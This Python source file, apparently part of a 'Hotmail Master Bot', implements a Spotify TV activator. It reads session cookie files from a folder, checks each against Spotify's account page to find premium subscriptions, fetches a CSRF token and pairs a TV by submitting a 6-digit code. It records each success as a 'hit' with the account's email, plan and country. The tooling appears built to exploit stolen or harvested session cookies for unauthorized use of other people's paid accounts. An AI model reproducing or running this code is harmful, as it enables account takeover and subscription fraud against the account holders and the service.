"""
Spotify TV Activator Engine
Based on SpotifyTV.py logic | Integrated into Hotmail Master Bot
"""
import os
import re
import json
import time
import uuid
import requests
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Tuple, Optional


class SpotifyTVActivator:
    """Spotify TV Activator - Activate Spotify on TV using 6-digit code"""

    def __init__(self, cookies_folder="spotify_cookies"):
        self.cookies_folder = Path(cookies_folder)
        self.cookies_folder.mkdir(exist_ok=True)
        self.hits_folder = Path("spotify_hits")
        self.hits_folder.mkdir(exist_ok=True)

        self.base_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8,ru;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
        }

        self.link_url = "https://accounts.spotify.com/en/link/v2"
        self.code_api_url = "https://accounts.spotify.com/pair/api/code"
        self.resolve_api_url = "https://accounts.spotify.com/pair/api/resolve"

    def parse_cookie_file(self, cookie_file: str) -> Optional[dict]:
        """Parse cookie file (Netscape format)"""
        cookie_path = self.cookies_folder / cookie_file
        if not cookie_path.exists():
            return None

        try:
            with open(cookie_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            cookies = {}
            for line in content.strip().split('\n'):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                parts = line.split('\t')
                if len(parts) >= 7:
                    cookies[parts[5]] = parts[6]
                elif '=' in line:
                    try:
                        k, v = line.split('=', 1)
                        cookies[k.strip()] = v.strip()
                    except:
                        pass

            return cookies if cookies else None
        except:
            return None

    def get_account_info(self, cookies: dict) -> Optional[dict]:
        """Check if Spotify account is valid and get info"""
        try:
            url = "https://www.spotify.com/eg-ar/account/subscription/manage/"
            headers = {
                'host': 'www.spotify.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }

            response = requests.get(url, headers=headers, cookies=cookies, allow_redirects=True, timeout=30)
            if response.status_code != 200:
                return None

            if "Don't have an account" in response.text or "إدارة اشتراكك" in response.text:
                match = re.search(r'"planNameLong":"([^"]*?)","planNameGpb"', response.text)
                if match:
                    plan = match.group(1)
                else:
                    plan = "Spotify Free" if "Spotify Free" in response.text else "Unknown"

                email_match = re.search(r'"email":"([^"]+)"', response.text)
                email = email_match.group(1) if email_match else None

                country_match = re.search(r'"country":"([^"]+)"', response.text)
                country = country_match.group(1) if country_match else "Unknown"

                is_premium = any(x in plan for x in ["Premium", "باقة", "Family", "Duo"])

                return {
                    'plan': plan,
                    'email': email,
                    'country': country,
                    'is_premium': is_premium
                }
            return None
        except:
            return None

    def find_premium_account(self) -> Tuple[Optional[str], Optional[dict], Optional[dict]]:
        """Find a premium Spotify account from cookies folder"""
        for cookie_file in self.cookies_folder.iterdir():
            if not cookie_file.is_file():
                continue

            cookies = self.parse_cookie_file(cookie_file.name)
            if not cookies:
                continue

            info = self.get_account_info(cookies)
            if info and info['is_premium']:
                return cookie_file.name, cookies, info

        return None, None, None

    def get_csrf_token(self, cookies: dict) -> Tuple[Optional[str], Optional[str], Optional[dict]]:
        """Get CSRF token and flow context for activation"""
        try:
            session = requests.Session()
            session.cookies.update(cookies)

            headers = self.base_headers.copy()
            headers['referer'] = 'https://www.spotify.com/'

            flow_ctx = f"{uuid.uuid4()}%3A{int(time.time())}"
            url = f"{self.link_url}?flow_ctx={flow_ctx}"

            response = session.get(url, headers=headers, allow_redirects=True, timeout=30)

            if response.status_code != 200:
                return None, None, None

            html = response.text

            csrf_token = None
            match = re.search(r'initialToken":"([^"]+)"', html)
            if match:
                csrf_token = match.group(1)

            flow_match = re.search(r'flow_ctx=([^"\s&]+)', html)
            flow_ctx = flow_match.group(1) if flow_match else flow_ctx

            updated_cookies = cookies.copy()
            for cookie in session.cookies:
                updated_cookies[cookie.name] = cookie.value

            return csrf_token, flow_ctx, updated_cookies
        except:
            return None, None, None

    def activate(self, cookies: dict, code: str, csrf: str, flow: str) -> Tuple[bool, str, Optional[str], Optional[requests.Response]]:
        """Activate Spotify on TV"""
        try:
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://accounts.spotify.com',
                'referer': f'https://accounts.spotify.com/en/link/v2?flow_ctx={flow}',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
            }

            if csrf:
                headers['x-csrf-token'] = csrf

            # Step 1: Submit code
            r1 = requests.post(
                f"{self.code_api_url}?flow_ctx={flow}",
                headers=headers,
                cookies=cookies,
                json={"code": code.upper()},
                timeout=30
            )

            if r1.status_code != 200:
                return False, "error", None, r1

            data = r1.json()

            if data.get('result') == 'invalid':
                return False, "invalid", None, r1

            if data.get('result') != 'ok':
                return False, "error", None, r1

            tv_name = data.get('codeInfo', {}).get('authorizationInfo', {}).get('clientInfo', {}).get('name', 'Unknown TV')

            # Step 2: Resolve
            r2 = requests.post(
                f"{self.resolve_api_url}?flow_ctx={flow}",
                headers=headers,
                cookies=cookies,
                json={"code": code.upper()},
                timeout=30
            )

            if r2.status_code != 200:
                return False, "error", tv_name, r2

            result = r2.json().get('result', '')

            if result in ['ok', 'success']:
                return True, "success", tv_name, None

            return False, "error", tv_name, r2
        except Exception as e:
            return False, "error", None, None

    def save_hit(self, code: str, info: dict, tv_name: str):
        """Save successful activation to hits folder"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = self.hits_folder / f"spotify_tv_activated_{timestamp}.txt"
        with open(filepath, 'w') as f:
            f.write(f"Spotify TV Activated Successfully\n")
            f.write(f"TV: {tv_name}\n")
            f.write(f"Code: {code}\n")
            f.write(f"Plan: {info.get('plan', 'Unknown')}\n")
            f.write(f"Country: {info.get('country', 'Unknown')}\n")
            f.write(f"Email: {info.get('email', 'Unknown')}\n")
            f.write(f"Time: {timestamp}\n")
        return filepath
